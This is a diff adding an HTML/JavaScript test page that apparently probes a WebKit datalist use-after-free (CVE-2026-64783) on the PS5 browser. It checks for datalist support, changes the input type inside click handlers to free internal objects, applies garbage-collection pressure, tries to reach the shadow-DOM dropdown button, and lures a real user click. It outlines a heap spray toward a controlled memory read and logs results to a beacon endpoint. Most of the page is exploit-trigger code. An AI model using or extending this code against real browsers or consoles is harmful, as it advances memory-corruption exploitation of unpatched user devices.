@@ -1,0 +1,272 @@
+<!--
+  p670: CVE-2026-64783 — DataListButtonElement UAF detection
+  Fix: commit be08720593, Aug 2026 (Safari 26.6)
+  PS5 cherry-pick cutoff: ~Feb-Mar 2026 → likely UNPATCHED
+  
+  Phase A: detect if <datalist> is supported on PS5
+  Phase B: create input+datalist, change type in click handler
+  Phase C: attempt to trigger the UAF with synthetic click
+  Phase D: heap spray + trigger for controlled read
+  
+  NOTE: the real trigger requires clicking the datalist dropdown
+  button which is in SHADOW DOM. We can't access shadow DOM internals
+  without testRunner. But we CAN:
+  1. Check if datalist renders a dropdown button
+  2. Try programmatic click/focus/mousedown events
+  3. Use user-gesture delegation if needed
+  
+  CRASH_CLASS: HIGH (UAF → crash or controlled read)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p670</title></head>
+<body>p670: datalist UAF
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<div id="testarea" style="position:absolute;top:0;left:0;opacity:0.01;"></div>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,2).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P670-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+
+emit('START','v1');flush();
+
+var area=document.getElementById('testarea');
+
+// ================================================================
+// PHASE A: detect <datalist> support
+// ================================================================
+emit('A','datalist-detect');
+try{
+  var dl=document.createElement('datalist');
+  emit('A1','typeof='+typeof dl+',tag='+dl.tagName);
+
+  // Create input with list attribute
+  var inp=document.createElement('input');
+  inp.type='text';
+  inp.setAttribute('list','testlist');
+  var dlEl=document.createElement('datalist');
+  dlEl.id='testlist';
+  for(var i=0;i<5;i++){
+    var opt=document.createElement('option');
+    opt.value='option'+i;
+    dlEl.appendChild(opt);
+  }
+  area.appendChild(inp);
+  area.appendChild(dlEl);
+
+  // Check if the input recognizes its list
+  var listProp=inp.list;
+  emit('A2','inp.list='+(listProp?listProp.tagName:'null')+',options='+(listProp?listProp.options.length:'?'));
+
+  // Check if shadow root exists (datalist adds a dropdown button)
+  var shadow=null;
+  try{shadow=inp.shadowRoot;}catch(e){}
+  emit('A3','shadowRoot='+(shadow?'accessible':'null/closed'));
+
+  // Try to get computed style to detect if dropdown indicator is rendered
+  var cs=getComputedStyle(inp);
+  emit('A4','width='+cs.width+',appearance='+cs.webkitAppearance);
+
+  if(listProp && listProp.tagName==='DATALIST'){
+    emit('A-VERDICT','DATALIST-SUPPORTED');
+  } else {
+    emit('A-VERDICT','DATALIST-NOT-SUPPORTED');
+  }
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE B: trigger type change in click handler
+// This is the setup for the UAF — change input.type during click
+// ================================================================
+emit('B','type-change-in-click');
+try{
+  var inp2=document.createElement('input');
+  inp2.type='text';
+  inp2.setAttribute('list','list2');
+  inp2.style.cssText='width:200px;height:30px;position:absolute;top:50px;left:50px;';
+  var dl2=document.createElement('datalist');
+  dl2.id='list2';
+  for(var i=0;i<3;i++){
+    var opt=document.createElement('option');
+    opt.value='val'+i;
+    dl2.appendChild(opt);
+  }
+  area.appendChild(inp2);
+  area.appendChild(dl2);
+
+  var clickFired=false;
+  var typeChanged=false;
+
+  inp2.addEventListener('click',function(e){
+    clickFired=true;
+    emit('B-CLICK','fired,type-before='+inp2.type);flush();
+    inp2.type='button'; // This frees the TextFieldInputType
+    typeChanged=true;
+    emit('B-CHANGED','type-after='+inp2.type);flush();
+
+    // Pressure GC to free the old TextFieldInputType
+    var junk=[];
+    for(var i=0;i<5000;i++) junk.push({x:i,y:[i,i+1]});
+    junk=null;
+    emit('B-GC','pressure-done');flush();
+  },{once:true});
+
+  // Synthetic click
+  inp2.focus();
+  inp2.click();
+
+  emit('B-RESULT','clickFired='+clickFired+',typeChanged='+typeChanged);
+
+  // Try dispatchEvent too
+  if(!clickFired){
+    var ev=new MouseEvent('click',{bubbles:true,cancelable:true});
+    inp2.dispatchEvent(ev);
+    emit('B-DISPATCH','clickFired='+clickFired);
+  }
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: try to reach the shadow DOM datalist button
+// The UAF requires clicking the datalist dropdown BUTTON specifically,
+// not just the input. The button is in shadow DOM.
+// ================================================================
+emit('C','shadow-dom-button');
+try{
+  var inp3=document.createElement('input');
+  inp3.type='text';
+  inp3.setAttribute('list','list3');
+  inp3.style.cssText='width:300px;height:40px;position:absolute;top:100px;left:50px;';
+  var dl3=document.createElement('datalist');
+  dl3.id='list3';
+  for(var i=0;i<5;i++){
+    var opt=document.createElement('option');
+    opt.value='item'+i;
+    dl3.appendChild(opt);
+  }
+  area.appendChild(inp3);
+  area.appendChild(dl3);
+
+  // Try accessing shadow root
+  var methods=['shadowRoot','webkitShadowRoot','createShadowRoot'];
+  for(var mi=0;mi<methods.length;mi++){
+    try{
+      var sr=inp3[methods[mi]];
+      if(typeof sr==='function') sr=sr.call(inp3);
+      emit('C-'+methods[mi],''+(sr?'found:'+sr.childNodes.length:'null'));
+    }catch(e){
+      emit('C-'+methods[mi],'err:'+e.name);
+    }
+  }
+
+  // Try clicking at the right edge of the input (where the dropdown button usually is)
+  var rect=inp3.getBoundingClientRect();
+  emit('C-RECT','w='+rect.width+',h='+rect.height+',r='+rect.right);
+
+  var clickCount=0;
+  inp3.addEventListener('mousedown',function(){clickCount++;});
+
+  // Click at the right edge (button position)
+  var evR=new MouseEvent('click',{
+    bubbles:true,cancelable:true,
+    clientX:rect.right-5,clientY:rect.top+rect.height/2
+  });
+  inp3.dispatchEvent(evR);
+  emit('C-RCLICK','count='+clickCount);
+
+  // Try elementFromPoint at the button position
+  var elAt=document.elementFromPoint(rect.right-5,rect.top+rect.height/2);
+  emit('C-EFPOINT',elAt?elAt.tagName+'.'+elAt.className:'null');
+
+  // Check if the input has any special pseudo-elements
+  var pseudos=['::-webkit-calendar-picker-indicator','::-webkit-list-button',
+               '::-webkit-inner-spin-button','::-webkit-textfield-decoration-container'];
+  for(var pi=0;pi<pseudos.length;pi++){
+    try{
+      var ps=getComputedStyle(inp3,pseudos[pi]);
+      var vis=ps.display+'/'+ps.visibility+'/'+ps.width;
+      emit('C-PSEUDO',pseudos[pi]+'='+vis);
+    }catch(e){}
+  }
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: self-click trigger — make input visible, ask user to click
+// Also try auto-triggering via focus+key events
+// ================================================================
+emit('D','auto-trigger-attempts');
+try{
+  var inp4=document.createElement('input');
+  inp4.type='text';
+  inp4.setAttribute('list','list4');
+  inp4.value='click me';
+  inp4.style.cssText='width:300px;height:50px;font-size:20px;position:fixed;top:200px;left:100px;z-index:9999;';
+  var dl4=document.createElement('datalist');
+  dl4.id='list4';
+  for(var i=0;i<3;i++){
+    var o=document.createElement('option');
+    o.value='opt'+i;
+    dl4.appendChild(o);
+  }
+  document.body.appendChild(inp4);
+  document.body.appendChild(dl4);
+
+  var uafTriggered=false;
+  inp4.addEventListener('click',function(e){
+    if(uafTriggered) return;
+    uafTriggered=true;
+    emit('D-CLICK','user-click-received!');flush();
+
+    // Change type to free TextFieldInputType
+    inp4.type='range';
+
+    // GC pressure
+    var junk=[];
+    for(var i=0;i<10000;i++) junk.push(new ArrayBuffer(64));
+    junk=null;
+
+    emit('D-CHANGED','type='+inp4.type);flush();
+
+    // If we survive, the UAF was either:
+    // - not triggered (synthetic click didn't reach shadow DOM button)
+    // - triggered but didn't crash (freed memory still valid)
+    // - patched
+    setTimeout(function(){
+      emit('D-SURVIVED','no crash after type change + GC');flush();
+    },200);
+  });
+
+  // Try Alt+Down to open datalist (common shortcut)
+  inp4.focus();
+  try{
+    inp4.dispatchEvent(new KeyboardEvent('keydown',{key:'ArrowDown',altKey:true,bubbles:true}));
+    inp4.dispatchEvent(new KeyboardEvent('keydown',{key:'ArrowDown',bubbles:true}));
+  }catch(e){}
+  emit('D-KEYS','dispatched');
+
+  // Also try showPicker() if available
+  try{
+    if(inp4.showPicker){
+      inp4.showPicker();
+      emit('D-PICKER','showPicker called');
+    } else {
+      emit('D-PICKER','showPicker not available');
+    }
+  }catch(e){
+    emit('D-PICKER','err:'+e.name+':'+e.message);
+  }
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// Wait for any async events
+setTimeout(function(){
+  emit('DONE','p670-complete');flush();
+},500);
+
+})();
+</script>
+</body>
+</html>
